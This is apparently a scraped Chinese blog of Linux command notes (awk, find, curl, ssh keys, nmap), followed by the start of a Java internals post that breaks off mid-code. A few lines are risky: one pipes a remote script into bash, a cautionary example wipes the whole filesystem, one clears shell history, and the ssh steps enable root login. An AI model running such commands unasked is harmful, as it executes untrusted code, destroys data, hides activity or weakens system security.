查找那些状态是deinstall的内核，然后用这样的方式purge掉sudo dpkg -P linux-image-3.5.0-51-generic /var/log/btmp 这个文件是记录错误登录的日志，如果开放22端口的话，用不了多久这个文件就会变得很大系统 /var/log 下面的文件：btmp, wtmp, utmp 等都是二进制文件，是不可以使用 tail 命令来读取的，这样会导致终端出错。一般使用 last 系列命令来读取，如 last, lastb, lastlog。 一个目录下按照文件大小排序 ls -Sralh ## 亲测，从小到大排序出来加上-S参数，就可以根据文件的大小进行排序，默认是从大到小的顺序。在此基础上加上参数-r变成-Sr，就可以一自小到大的顺序打印出文件。-l参数表示打印出详细信息。 6. AWK文本分析工具 AWK is a language for processing text filesawk was created at Bell labs released in 1977Named after Alfred Aho, Peter Weinberger,and Brain KernighanTAPL= The AWK Programming Language awk ‘{print $0}’ /etc/passwd # 和cat差不多，显示文本内容查看恶意IP试图登录次数： lastb | awk ‘{ print $3 }’ | sort | uniq -c | sort -n ## 亲测可用,看上去挺吓人的 awk怎么用Using Linux AWK Utility，一个没有废话的教程，非常好。官方的古老的awk教程 drwxr-xr-x 3 root root 4096 Mar 14 2017 ufw-rw-r–r– 1 root root 338 Nov 18 2014 updatedb.confdrwxr-xr-x 3 root root 4096 Aug 30 03:53 update-managerdrwxr-xr-x 2 root root 4096 Aug 30 03:53 update-motd.ddrwxr-xr-x 2 root root 4096 Mar 14 2017 update-notifierdrwxr-xr-x 2 root root 4096 Mar 14 2017 vimdrwxr-xr-x 3 root root 4096 Mar 14 2017 vmware-toolslrwxrwxrwx 1 root root 23 Mar 14 2017 vtrgb -&gt; /etc/alternatives/vtrgb-rw-r–r– 1 root root 4942 Jun 14 2016 wgetrcdrwxr-xr-x 5 root root 4096 Mar 14 2017 X11drwxr-xr-x 3 root root 4096 Mar 14 2017 xdgdrwxr-xr-x 2 root root 4096 Mar 14 2017 xml 假设你面对一个这样的文件test.txtprint 每一行 : awk ‘{ print }’ test.txtprint第一行 ： awk ‘{ print $1 }’ test.txtprint第二行: awk ‘{ print $2 }’ test.txtprint第一行和第二行 awk ‘{ print $1,$2 }’ test.txtprint第一行和第二行中间不带空格 awk ‘{ print $1$2 }’ test.txtprint包含’test’的行 awk ‘/test/ { print } test.txt’print第二行包含’test’的行 awk ‘{if(2 ~ /test/) print }’ test.txtawk ‘/[a-z]/ { print }’ test.txt //包含a-z任一字母的awk ‘/[0-8]/ { print }’ test.txt // 包含0-8任一数字的awk ‘/^[0-8]/ { print }’ test.txt // 以0-8任一数字开头的awk ‘/[0-8]$/ { print }’ test.txt //以0-8任一数字结尾的awk ‘NR==5 || NR==9’ “file” //NR是行号awk ‘NR&gt;=5&amp;&amp;NR&lt;=9’ “file” //NR还可以指定行号范围 sudo last | awk ‘{ print $(NF-7)}’ //我想看倒数第7列的数据 和管道结合的：grep -i test test.txt | awk ‘/[0-9]/ { print }’-i表示case insensitive,大小写都算.然后找出其中包含数字的。 想要找出系统内所有大小超出10MB的，合计一下这些大文件一共占用了多少MB的空间sudo find / -size +10M -exec du -h {} \\; | awk ‘{ s+=$1 } END { print s}’ *查找大文件，并且按照文件大小从大到小排序sudo find -type f -size +10M -print0 |xargs -0 du -h|sort -nr awk里面还能for循环sudo netstat -a | awk ‘/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}’ awk -F ‘“‘ xxxxx ### 以双引号为分隔符的 30个实用的awk命令 awk正则awk ‘$1 ~ /J/‘ inventory-shipped ## 有大写字母J的话就打印出来awk ‘$1 !~ /J/‘ inventory-shipped ##排除所有包含J的内容 阮一峰的awk教程 7.tar命令主要是跟压缩和解压文件有关的,参考 tar -cvf log.tar log2012.log 仅打包，不压缩！ tar -zcvf log.tar.gz log2012.log 打包后，以 gzip 压缩 tar -jcvf log.tar.bz2 log2012.log 打包后，以 bzip2 压缩 常用的tar命令就那么几个tar -cvf all.tar.gz 和 tar -xf all.tar.gz这俩其实就够用了 //其实解压缩应该是这样的就好了alias untar=’tar -zxvf ‘ 对照手册来看：-c //小写的c，–create，表示创建新的备份文件-v //verbose,显示进度什么的-f 指定要操作的archive文件-z –gzip，通过gzip压缩或者解压文件 8.定时任务怎么写(crontab)已经有网站把各种常用的example写出来了，直接照抄就是后面跟上需要的命令，例如重启就是 /sbin/reboot 9.find根据文件名查找文件 - find -name *.config #在当前目录下查找 - find / -name finename # 在根目录下查找filename的文件(&quot;filename&quot;用双引号包起来) 10.已安装的软件 sudo dpkg -l 11.Ping一个主机 ping -c 5 gmail.com #只发送5次 12.Wget下载文件 wget url下载文件并以指定的文件名保存下来 wget -0 filename url 13.查看文件的时候显示行号cat -n rsyslog.conf # 显示行号，报错的时候方便处理-n 显示行号（包括空行）-b 显示行号（不包括空行） 14.统计文件夹下特定文件类型的数目 ls -l |grep “^-“|wc -l ##统计某文件夹下文件的个数 ls -l |grep “^ｄ”|wc -l ##统计当前目录中文件夹的数量 ls -lR|grep “^-“|wc -l ##递归一层层往下找的话，加上一个R就可以了统计某个目录下的所有js文件： ls -lR /home/user|grep js|wc -l ls -alh ## 亲测，可以显示当前目录下各个文件的大小 关于wc的一些参数 -c 统计字节数。-l 统计行数。-m 统计字符数。这个标志不能与 -c 标志一起使用。-w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。-L 打印最长行的长度。-help 显示帮助信息–version 显示版本信息wc filename ##默认显示出来的三列分别是行数，字数，字节数 15. curl命令写shell脚本可能会用到网络交互，curl可以发起网络请求，下载文件，上传文件，cookie处理，断点续传，分段下载,ftp下载文件随便写两个： curl -o home.html http://www.baidu.com #把百度首页抓下来，写到home.html中 curl -d “user=nick&amp;password=12345” http://www.xxx.com/login.jsp # 提交表单，发起POST请求 curl的几种常见用法 curl -i -H “Accept: application/json” “https://jsonplaceholder.typicode.com/posts“ ## -i 表示include，就是说把header包含在response中 要是只需要header的话curl -s -I -X POST http://www.google.com //只需要header就行了 下面是一个简单的通过CURL提交POST请求的方式-X是指定HTTP method，默认是GET curl –header “Content-Type: application/json” –request POST –data ‘{“userId”:10,”title”:”sometitle2”,”body”:”somebody2”}’ https://jsonplaceholder.typicode.com/posts 下面这个是简写curl –header “Content-Type: application/json” -X POST -d ‘{“userId”:10,”title”:”sometitle2”,”body”:”somebody2”}’ https://jsonplaceholder.typicode.com/posts json规范不允许单引号curl –header “Content-Type: application/json” -X POST -d ‘{“userId”:10,”title”:”sometitle2”,”body”:”somebody2”,”hobby”:[{“name”:”bob”,”age”:10},{“name”:”sam”,”age”:20}]}’ http://127.0.0.1:5000/ curl show raw responsecurl -iv –raw https://www.google.com/ (#i是include header，v是verbose) 甚至还有直接一行行写html报文的： echo &#39;GET / HTTP/1.1 Host: baidu.com &#39; | openssl s_client -quiet -connect baidu.com:443 2&gt;/dev/null 记得http statusCode 302是重定向什么 ： curl -v mail.qq.com输出：```curl -v mail.qq.com Rebuilt URL to: mail.qq.com/ Trying 103.7.30.100… Connected to mail.qq.com (103.7.30.100) port 80 (#0) GET / HTTP/1.1Host: mail.qq.comUser-Agent: curl/7.47.0Accept: / &lt; HTTP/1.1 302 Found&lt; Server: TWS&lt; Connection: close&lt; Date: Sun, 19 Nov 2017 09:19:46 GMT&lt; Content-Type: text/html; charset=GB18030&lt; Location: https://mail.qq.com/cgi-bin/loginpage&lt; Content-Security-Policy: referrer origin; script-src ‘self’ https://hm.baidu.com http://hm.baidu.com .google-analytics.com http://mat1.gtimg.com https://mat1.gtimg.com http://.soso.com https://*.soso.com http://*.qq.com https://*.qq.com http://*.qqmail.com https://*.qqmail.com http://pub.idqqimg.com blob: ‘unsafe-inline’ ‘unsafe-eval’; report-uri https://mail.qq.com/cgi-bin/report_cgi?r_subtype=csp&amp;nocheck=false&lt; Referrer-Policy: origin&lt; Content-Length: 0&lt; Closing connection 0```http 302的意思也就说明qq邮箱已经把http重定向到别的地方的 16. 搭建samba服务器这个主要是用来从windows上访问linux主机上的文件的 sudo apt-get install samba剩下的就是设定要分享的目录，给权限，设定访问密码，启动服务这些了教程 17. tee命令 echo $(date) | tee -a date.logtee命令能够吧程序的输出输出到stdo,同时还能将输出写进文件(-a 表示append，否则就是覆盖) 18. missing argument to `-exec’find和exec命令结合起来能够实现指定（或者不指定）文件中查找特定字符的效果比方说在sqlalchemy项目中，查找当前目录下所有的py文件，在里面扫描SQLALCHEMY_DATABASE_URI的值 sudo find . -name “.py” -exec grep “SQLALCHEMY_DATABASE_URI” {} \\;sudo find . -name “.py” | xargs grep “SQLALCHEMY_DATABASE_URI”grep SQLALCHEMY_DATABASE_URI . -R 上面这仨都是ok的 ,第一种不会把对应的文件名列出来，第二种和第三种会把文件名列出来。第三种的-R当然是递归(recursive)的意思 find /u03 -name server.xml -exec grep &#39;9080&#39; {}\\; find . -type f -exec ls -l {} \\; ## exec执行删除之前最好先打印出来，避免删错了 find . -type f -mtime +14 -exec rm {} \\; find /etc -name &quot;passwd*&quot; -exec grep &quot;root&quot; {} \\; 另外 {} + 和 {} \\; 这两种写法是有区别的[what-is-meaning-of-in-finds-exec-command(https://unix.stackexchange.com/questions/195939/what-is-meaning-of-in-finds-exec-command) exec是和find一起使用的，分号是要执行的命令的终止标志，前面得加上斜杠。简单来说，就是把exec前面的结果执行某项操作，语法上，大括号不能少，反斜杠不能少，分号不能少感觉exec和find 命令的xargs差不多find命令要结合着exec和xargs命令一起来看xargs命令exec命令可以认为就是把find出来的所有结果填充到exec的大括号里面,因为平时实际从一个文件中查找字符的方式就是grep “SQLALCHEMY_DATABASE_URI” somefilename这也造成了使用exec经常出现语出错误，find命令把匹配到的文件传递给xargs命令，而xargs命令每次只获取一部分文件而不是全部，不像-exec选项那样。xargs是分批处理参数并传递给后续的命令。 xargs和grep一起用有时候会出现no such file or directory的错误why-does-grep-print-out-no-such-file-or-directory find . -type f -print0 | xargs -0 fgrep “SQLALCHEMY_DATABASE_URI” xargs的一些用法find . -name “.log” | xargs -i mv {} test4find . -name “.log” | xargs -p -i mv {} .. ## -p会提示用户是否要执行后续操作 find / -type ## 这个-type表示类型，f是普通文件,d是目录,c是字符设备文件,p是管道文件,l是符号链接文件 要想让系统高负荷运行，就从根目录开始查找所有的文件。find / -name ““ -print如果想在当前目录查找文件名以一个个小写字母开头，最后是4到9加上.log结束的文件：find . -name “[a-z][4-9].log” -print find还可以根据文件权限来查找find . -perm 755 -print ## 比如查找当前755权限的文件find还可以忽略指定目录-prune参数还可以按照修改时间或者访问时间等来查找文件sudo find / -size +10M -mtime -2 -exec du -h {} \\; ## 查看最近两天修改的文件中那些大小超过了10M，并且列出来sudo find / -name “*.log” -size +10k -mtime -2 -exec du -h {} \\; | sort -n ## 把最近两天内修改的.log文件（超过10K的）按照文件大小从大到小排列出来atime = accesstime(文件被read或者执行的时间)ctime = changetime(文件状态改变时间，比如被chmod就算)mtime = modify time，指的是文件内容被修改的时间这些时间都能通过sta命令查看 19. sort命令sort命令排序什么的 ls -al | sort -n ## 按照文件名ASCII码值进行比较 ls -al | sort -rn ## 按照文件名倒序排序 du -hsBM ./* | sort -n ##查看当前目录下所有文件，从小到大排序 -u(unique)是忽略相同行，查找登录记录的时候有用-t 指定按照栏和栏之间的分隔符 20. history命令history ## 列出曾经执行过的命令 !99 ##执行上面列表中第99条命令 !! ##执行上一条命令 history 10 ##列出最近执行的10条命令 21. 使用sshKeyGen免密码登录的方式首先在windows上安装putty，默认会装上puttyGen。在开始菜单里面总归能找到。点击那个generate按钮，按照提示鼠标不停挪动，进度条走完。会生成公钥，点击Save private key生成私钥。提示保存在一个文件中，这个要保存好。暂时不要关闭puttygen,需要直接去复制粘贴那个public key(因为要是生成了一个public key，由于windows的原因，中间可能存在换行，就得在文本编辑器里面删掉所有的换行符，非常麻烦)密码登录到服务器端，cd到~/.ssh/文件夹下，没有就mkdir一个，创建一个authorized_keys的文件，要是本来就有，echo &gt; authorized_keys，把内容清除干净。把自己刚才生成的public key粘贴进去，保存文件。看下/etc/ssh/sshd_config中是否符合如下描述如下条件 RSAAuthentication yes PubkeyAuthentication yes PermitRootLogin yes 还要给权限chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys重启ssh服务： service sshd restartputty登录窗口左侧有一个loggin-auth，进去选择自己windows上刚才保存的私钥文件。登录输入账户名即可自动登录成功。PUTTYGEN - KEY GENERATOR FOR PUTTY ON WINDOWS有什么问题的话看这个 22.iptables命令常用的iptables命令去这里抄，系统管理员可能用的多一些 23. Linux软件安装目录惯例转载自。一般特定文件夹里放什么东西是有惯例的。cd到根目录下长这样drwxr-xr-x 26 root root 4096 Jan 26 10:08 .drwxr-xr-x 26 root root 4096 Jan 26 10:08 ..drwxr-xr-x 2 root root 12288 Jan 5 22:52 bin ##sbin和bin一样，存executable programsdrwxr-xr-x 4 root root 3072 Jan 26 10:08 bootdrwxr-xr-x 18 root root 4060 Feb 3 17:00 devdrwxr-xr-x 109 root root 4096 Feb 4 04:18 etc ##configuration files , 比如passwddrwxr-xr-x 3 root root 4096 Aug 6 05:42 home ##所有用户的home directorydrwxr-xr-x 22 root root 4096 Jan 5 22:53 lib ## 系统用的common librarydrwxr-xr-x 2 root root 4096 Jan 19 06:30 lib64 ##drwx—— 2 root root 16384 Mar 14 2017 lost+founddrwxr-xr-x 3 root root 4096 Mar 14 2017 mediadrwxr-xr-x 2 root root 4096 Feb 15 2017 mnt ##temp file systems are attached like cd rom or usb drive(就当优盘好了)drwxr-xr-x 2 root root 4096 Feb 15 2017 optdr-xr-xr-x 130 root root 0 Feb 3 17:00 proc ##这个念procedure, 代表virtual file system stores kernel info，知道为什么看cpu型号要cat /proc了吧drwx—— 6 root root 4096 Dec 21 02:16 root ##root account的根目录drwxr-xr-x 25 root root 940 Feb 4 08:07 rundrwxr-xr-x 2 root root 12288 Jan 19 06:30 sbin ##sbin和bin一样，存executable programs,s代表essential system binarydrwxr-xr-x 2 root root 4096 Jan 14 2017 snapdrwxr-xr-x 2 root root 4096 Feb 15 2017 srvdr-xr-xr-x 13 root root 0 Feb 4 08:08 sysdrwxrwxrwt 9 root root 4096 Feb 4 08:05 tmp ## contain temporary data,注意，该目录下文件重启后被eraseddrwxr-xr-x 11 root root 4096 Dec 10 01:04 usr ##这里面有bin man sbin等目录，存放user program and other data(并不是user，而是universal system resources)drwxr-xr-x 14 root root 4096 Dec 10 22:21 var ## 全称variable，存放variable data where system must be able to write during operation(就是log) /usr：系统级的目录，可以理解为C:/Windows/，/usr/lib理解为C:/Windows/System32。/usr/local：用户级的程序目录，可以理解为C:/Progrem Files/。用户自己编译的软件默认会安装到这个目录下。/opt：用户级的程序目录，可以理解为D:/Software，opt有可选的意思，这里可以用于放置第三方大型软件（或游戏），当你不需要时，直接rm -rf掉即可。在硬盘容量不够时，也可将/opt单独挂载到其他磁盘上使用。 /usr/src：系统级的源码目录。/usr/local/src：用户级的源码目录。 各个目录youtube-dl的安装途径就是下一个软件下来，然后chmod给权限，然后/usr/local/bin/youtube-dl和直接敲youtube-dl是一个命令。好像放在这个目录下面就好了。关于这些目录的解释/bin是系统的一些指令。bin为binary的简写；/sbin一般是指超级用户指令。就是只有管理员才能执行的命令/usr/bin：通常是一些非必要的，但是普通用户和超级用户都可能使用到的命令/usr/local/bin：通常是用户后来安装的软件，可能被普通用户或超级用户使用 /var：某些大文件的溢出 区，比方说各种服务的日志文件。/usr：最庞大的目录，要用 到的应用程序和文件几乎都在这个目录。/usr/local: 本地安装的程序和其他东西在/usr/local下一份比较全面的Linux 下各文件夹的结构说明及用途介绍 24. 一个往dropBox上传文件的Scriptdropbox的网盘空间不用感觉有点浪费了，一个将本地文件上传到dropBox的脚本Dropbox-Uploader亲测可用，也不是一个需要启动时跑起来的程序，就是一个给参数就上传的脚本。 ./dropbox_uploader.sh upload /localFileOrDir /dropBoxFileOrDir 25. fuser显示当前文件正在被哪些进程使用fuser -m -u redis-server 26. 一些看上去比较玄的操作bash &lt;(curl -s https://codecov.io/bash) ##重定向还有这么玩的 pbcopy &lt; somefile.txt ## mac上一般这样复制一个文件的内容到剪切板 27.htop怎么看process state图片出处 PROCESS STATE CODES R running or runnable (on run queue) D uninterruptible sleep (usually IO) S interruptible sleep (waiting for an event to complete) Z defunct/zombie, terminated but not reaped by its parent T stopped, either by a job control signal or because it is being traced […] 一般都是S比较多，Z属于Zombie进程，直接干掉 再提一下top是怎么看的top其中第三行CPU信息中：usr 代表用户空间占用CPU的百分比，sys 代表内核空间占用CPU的百分比，nic 代表改变过优先级的进程占用CPU的百分比，idle 代表空闲的CPU的百分比，io 代表IO等待占用CPU的百分比，irq 代表硬件中断占用CPU的百分比，sirq 代表软件中断占用CPU的百分比。 Mere trashgdb调试器,debug用的 文件描述符限制 ls -al = l -al（可以少敲一个字母,其实是alias） small tricks cat &gt; filename.txt then start typing your text content ctrl +d to finish pushd and popd can help you jump to some directory can come back later gdebi ## like dpkg command , will install required dependency if needed cpulimit command ##limit the cpu usage to certain process htop中按f4可以filter，按f9可以杀进程。 按下空格键可以选中某个process（用于多选） bleachbit可以帮助清理垃圾 rsync用于做系统备份 rsync -avz --delete Pictures/ 192.168.0.10:Pictures/ ## a表示archive，就是说保留源文件的permission,timestamp等等， v表示verbose, z表示zip(就像gzip一样，通过网络传输的时候能够节省流量),记得Pictures后面的斜杠不能少 ubuntu上使用sudo xxx ，输入密码后，下次sudo就不会再次要求密码了，但其实系统会起一个倒计时，如果接下来的30分钟（大概这个时间）内没有执行sudo命令，将会再次提示要求输入密码 解决方法sudo -su // 即后续sudo指令不需要密码 打开tty的方法: ctrl + alt + (f1-f8) sfpt cindy@192.168.0.2 ##以cindy的身份登录这台机器 ## bash的窗口在等待输入的时候一般长这样: john@server ~ $ john表示当前用户名称 sever表示当前主机名称 ~表示当前所在目录 $表示没有特殊权限，就是说不是root previledge的意思 bash和sh的区别 &gt; #!/bin/bash ## 一个井号加上一个感叹号在计算机领域叫做shebang.很多shell脚本的第一行都有： #!/bin/bash 一定是bash，万一没装bash会报错,还有些系统的bash装载/usr/pkg/bin或者/usr/local/bin里面 或者是 #!/bin/sh 就会使用当前操作系统上的sh,不一定是bash.比如debian上sh是dash的symbolic link 比较可靠的方式是 #!/usr/bin/env bash 用的是$PATH ## file -h /bin/sh 这个命令用于查看文件 /bin/sh: symbolic link to dash Because sh is a specification, not an implementation, /bin/sh is a symlink (or a hard link) to an actual implementation on most POSIX systems.(sh是POSIX标准规定的一套协议，并非实现.sh的实现有很多种，zsh,dash,bash等等。但在很多系统上，sh是bash的symbolic link).相比起来,bash的功能要比sh强大不少。Plain sh is a very minimalistic programming language. ### 下面这三个要跟ctrl+z一起用 bg ##看之前按ctrl+z退到后台的程序 jobs ##查看当前在跑的程序 fg job name ##把这个程序拉到前台 比方说当前目录下有一个dump.sh文件，想要执行的话，输入dump是没有用的。因为echo $PATH中并没有这个dump:目录/dusp.sh。 所以要执行这个sh，需要./dump.sh 或者建一个symbolic link到 /usr/local/bin下面，比如这样 sudo ln -s /full/path/to/your/file /usr/local/bin/name_of_new_command 想要可执行的话，记得给权限。chmod +x /full/path/to/your/file 当然，想要移除这个软链接的话. sudo rm -rf /usr/local/bin/name_of_new_command 关于硬链接和软连接 -s 就是软链接。不加-s就是硬链接。 修改硬链接和软链接的内容都会同步到源文件，软链接和硬链接删掉了都不会影响源文件。有一个区别就是删掉源文件时，硬链接保有了源文件的内容。 软链接就broken了。 visudo //via sudo 这是一个控制用户权限的文件，比如说希望给特定用户一部分usdo特权，比如只给安装软件的权利，编辑这个文件就可以 为什么不要总以root权限做事: sudo rm -rf /etc/dummyfile ## 看上去ok sudo rm -rf / etc/dummyfile ## 不小心多了个空格，系统并不会拦着你，这样就删掉了所有的文件 raspberry Pi使用的是Raspbian -- 基于debian 查看内存除了free 和htop之外 sudo sh -c &quot;sync; echo 3 &gt; /proc/sys/vm/drop_caches&quot; ## 就是用sh执行一个command, 即dump memory cache，类似于windows上360那个点击清内存 sudo bash -c &quot;echo &#39;vm.swappiness =15&#39; &gt;&gt; /etc/sysctl.conf&quot; ## -c表示让bash执行一个命令， swappiness默认值是60，意思是系统在用掉了60%的内存后就将开始启用swap nmap可以用来扫描某台远程主机上open的port直接看nmap cheetsheet好了 nmap -p 1-100 192.168.1.1 ## 扫描1-100的port，非常慢 linux的swap文件需要经常读写，这对于ssd来说是一个需要注意的地方digital ocean在添加swap教程的最前面就写了不建议ssd用户添加swap,因为会费ssd bash下的一些快捷键 Ctrl-u - Cut everything before the cursor // 清除光标之前所有文字 Ctrl-k Cut everything after the cursor //删除光标后面的所有文字 Ctrl-a Move cursor to beginning of line //光标挪到最前面 Ctrl-e Move cursor to end of line // 挪到最右侧 Ctrl-b Move cursor back one word //这个是一个字一个字的挪，不识别空格 Ctrl-f Move cursor forward one word//这个是一个字一个字的挪，不识别空格 alt + → 一个单词一个单词的往右挪，往左挪自然就是向左箭头了。 Ctrl-w Cut the last word Ctrl-y Paste the last thing to be cut Ctrl-_ Undo supervisor可以用于管理一些程序的运行，挂了负责自动拉起来。很简单的，就是装一个软件，写一个conf。 apt-get的数据库放在 /var/lib/dpkg/info dpkg: warning: files list file for package `x&#39; missing; assuming package has no files currently installed ##出现上面的错误，这两条命令修复 sudo rm -f /var/lib/dpkg/info/format sudo dpkg --configure -a unix domain socket用于ipc 有时候cd进一个权限不够的目录会出现Permission Denied sudo sucd directory直接转成root就好了 nano直接跳到文本最后一行的方法是： Ctrl + _ 然后Ctrl +V 装java装JenkinsCould not find or load main class的问题 🎧 ~/.vimrc文件修改之后是不需要source的，下次重新启动一个vim的时候vim会直接去读这个文件 查看当前shell的history文件是哪个echo $HISTFILE清除shell history的话：history -c然后删掉这个文件rm $HISTFILE 熟悉了bash之后，再来看zsh，似乎更加轻松看一下我当前使用的是哪种sh: echo $SHELLlinux上目测没有默认安装zsh。 linux上.pid文件是用于记录当前进程运行信息的cat /var/run/nginx.pid435看下ps -a | grep nginx 是不是也是435的pid 安装完zsh一定要装上这个的，on-my-zshzsh有一个plugin的概念，这个是自动提示的插件zsh的主题个人偏好Draculaagnoster是另一款很多人都装上的主题，主题这种东西看个人喜好了。 如果在国内使用的话，使用清华大学开源站的镜像的速度会快一点 oh-my-zsh的git plugin 快捷键grep -ni “python” * //在当前目录下查找所有包含”python”字符串的文件，并且显示出行号。 ctrl +r 可以在history中查找,ctrl + j 把选中的内容剪切到剪切板 不用装tree这个软件也行 which treetree: aliased to find . -print | sed -e ‘s;[^/]*/;|;g;s;|; |;g’ 参考 每天一个Linux命令 Linux命令大全 awk是三个人的名字 树莓派搭建局域网媒体服务器，下载机 Linux中国","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"For those tiny details in Java","date":"2017-06-17T21:24:48.000Z","path":"2017/06/17/2017-06-17-tiny-details-in-java/","text":"interesting stuff in java that don’t seem to get enough pubilicity 1. getting the concreate class from generic types```java /** * Make a GET request and return a parsed object from JSON. * * @param url URL of the request to make * @param clazz Relevant class object, for Gson&#39;s reflection * @param headers Map of request headers */ public GenericMoshiRequest(String url, @Nullable Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener) { super(Method.GET, url, errorListener); // this.clazz = clazz; Class entityClass = (Class) ((ParameterizedType) getClass().getGenericSuperclass()).getActualTypeArguments()[0];//使用反射获得泛型对应class this.clazz = entityClass; this.headers = headers; this.listener = listener; } ``` 2. OkHttp 默认会自动重试失败的请求okhttp-is-quietly-retrying-requests-is-your-api-readyOkHttp默认会对请求进行重试，具体是在RetryAndFollowUpInterceptor中进行的。 RetryAndFollowUpInterceptor.java @Override public Response intercept(Chain chain) throws IOException { Request request = chain.request(); streamAllocation = new StreamAllocation( client.connectionPool(), createAddress(request.url()), callStackTrace); int followUpCount = 0; Response priorResponse = null; while (true) { # 不停的尝试 if (canceled) { streamAllocation.release(); throw new IOException(&quot;Canceled&quot;); } Response response = null; boolean releaseConnection = true; try { response = ((RealInterceptorChain) chain).proceed(request, streamAllocation, null, null); releaseConnection = false; //默认不认可response成功 } catch (RouteException e) { // The attempt to connect via a route failed. The request will not have been sent. if (!recover(e.getLastConnectException(), false, request)) { throw e.getLastConnectException(); } releaseConnection = false; continue; //继续尝试 } catch (IOException e) { // An attempt to communicate with a server failed. The request may have been sent. boolean requestSendStarted = !(e instanceof ConnectionShutdownException); if (!recover(e, requestSendStarted, request)) throw e; releaseConnection = false; continue; //继续尝试 } finally { // We&#39;re throwing an unchecked exception. Release any resources. if (releaseConnection) { //出现不可预料的错误，释放硬件资源，端口什么的 streamAllocation.streamFailed(null); streamAllocation.release(); } } } } 客户端当然可以使用retryOnConnectionFailure禁止这种自动重试策略，但不建议这么做。另外，为避免减少不必要的重试请求，OkHttp 3.3.0 issue Don’t recover if we encounter a read timeout after sending the request, but do recover if we encounter a timeout building a connection建立连接超时可以重试(客户端到服务器的通道不可靠，当然可以重试)，连接上之后读取超时则不去重试(服务器出了问题，没有必要重试)。 另外，GET方法本身是人畜无害的，Retry请求多次发起不会造成数据错误；但对于POST，涉及到写服务端写操作，最好带上GUID作为单次请求unique标示。（这是server和client之间需要协商好的protocol） 3. From Java Code To Java Heap A talk from IBM Engineer, talking about optimizing the memery usage for your java application.youtube ibm 4. 强行更改String的内容 String这种东西是放在常量池里面的，所以 String a = &quot;hello&quot; String b = &quot;hello&quot; String c = new String(&quot;Hello&quot;) 显然ab都指向了常量池，c指向了放在堆上的对象，后者也指向常量池 a==b!=c //更改这个String里面的东西 Field a_ = String.class.getDeclaredField(&quot;value&quot;); a_.setAccessible(true); char[] value=(char[])a_.get(a); value[3]=&#39;_&#39;; //修改a所指向的值 这样a,b,c 的值都改掉了 void internSample(){ String str1 = &quot;Go to hell&quot;; String str2 = str1.intern(); System.out.println(str1==str2); System.out.println(&quot;before modification str1 = &quot;+str1); System.out.println(&quot;before modification str2 = &quot;+str2); try { Field f = String.class.getDeclaredField(&quot;value&quot;); f.setAccessible(true); f.set(str2,&quot;Dump ass&quot;.toCharArray()); } catch (NoSuchFieldException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } System.out.println(&quot;after modification str1 = &quot;+ str1); System.out.println(&quot;after modification str2 = &quot;+ str2); } 输出： truebefore modification str1 = Go to hellbefore modification str2 = Go to hellafter modification str1 = Dump assafter modification str2 = Dump ass Process finished with exit code 0 5. 注解 Builder(Retrofit retrofit, Method method) { this.retrofit = retrofit; this.method = method; this.methodAnnotations = method.getAnnotations();// 返回的是一个Annotation[]数组 this.parameterTypes = method.getGenericParameterTypes();// 比如HashMap的put方法，这个方法返回一个Type[2]，分别是&#39;K&#39;,&#39;V&#39; this.parameterAnnotationsArray = method.getParameterAnnotations(); } 如果不是看到Retrofit的源码，一般还真没机会了解到这几个方法。。 6. java如何把char类型数据转成int类型数据String a = “123”Stirng本质上就是一个char[]的包装类，1对应Asicii码的49,2对应50,3对应51.所以实质上就类似于char[] = new char{49,50,51} ; 想把1,2,3分别拿出来得这么写： char[] array = a.tocharArray(); for(i=0;i&lt;=array.length();i++){ int a = Integer.parseInt(String.valueof(array.charAt(i)));//这样就能分别把1,2,3拿出来了。 } 根据stackoverFlow的解释, char只是16bit的数字，也就是int（4个字节,32位）的子集。 char word = &#39;A&#39; +1234 ;//编译通过 char word2 = &#39;A&#39;; word2 = word2 +1 ;//编译失败 char的转换问题 7. Guava就是个Util8. 从ArrayList的ConcurrentModificationException说起ArrayList的ConcurrentModificationException一般在使用Iterator的时候会抛出，普通的get，set不会。 private class Itr implements Iterator&lt;E&gt; { int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; //简单的三个成员变量，cursor会在外部调用next方法时自增1，在 // lastRet 会在调用next时候设置为next方法返回的Value的index，在remove时设置为-1 } //Itr的next 方法只是返回了array[cursor],cursor是从0开始的。 // Itr的remove方法调用了ArrayList的remove方法（modeCount++），expectedModCount设置为modCount // 之所以调用Iterator一边迭代一边删除，一方法是hasNext方法检测了当前index不会超出数组大小。另外在remove的时候会将当前Iterator的预期下一个操作位置cursor设置为上一次操作的位置（remove里面还有一个arrayCopy）。 final void checkForComodification() { if (modCount != expectedModCount) throw new ConcurrentModificationException(); } 假定开了十条线程，每条线程都调用ArrayList的ListIterator，各自得到一个new Itr的实例。而这些Itr的modecount都是从这一个ArrayList拿的，expectedModCount则是各自保存的。一个原则就是，对于这个集合结构性的更改，同时只能有一条线程来做。每条线程的expectedModCount都会在调用ArrayList的remove方法之后被赋值为ArrayList的modCount。next和remove方法开头都调用了这个checkForComodification。就在于next会因为其他线程的结构性更改抛出IndexOutOfBoundsException，但实际上问题并不出在next方法取错了index。同理，remove方法调用的是可能抛出IndexOutOfBoundsException的ArrayList的remove方法，但实际问题并不出在remove传错了对象。Itr本身保存的index是正确的，只是外部环境的变更使得这些index存在多线程条件下的不可靠性。即迭代器对象实例保持了一些对于外界环境的预期，而并发条件下对于集合的结构性更改使得这些必要的预测信息变得不可靠。 ListIterator和Iterator(next,hasNext以及remove)和两个接口，前者在后者的基础上加了一些方法(add,set,remove等方法). 改成CopyOnWriteArrayList为什么就不会崩了： static final class COWIterator&lt;E&gt; implements ListIterator&lt;E&gt; { /** Snapshot of the array */ private final Object[] snapshot; /** Index of element to be returned by subsequent call to next. */ private int cursor; } 没有了expectedModCount，成员变量就这俩。CopyOnWriteArrayList直接实现List，写操作都用ReentrantLock锁上了，即同时只能有一条线程进行写操作，get没有加锁。private transient volatile Object[] array;注意保存数据的array是volatile的，任何一条线程写的操作都会被所有的读取线程看到(skip了cpu缓存)，set的时候，以set为例： public E set(int index, E element) { final ReentrantLock lock = this.lock; lock.lock(); try { Object[] elements = getArray(); E 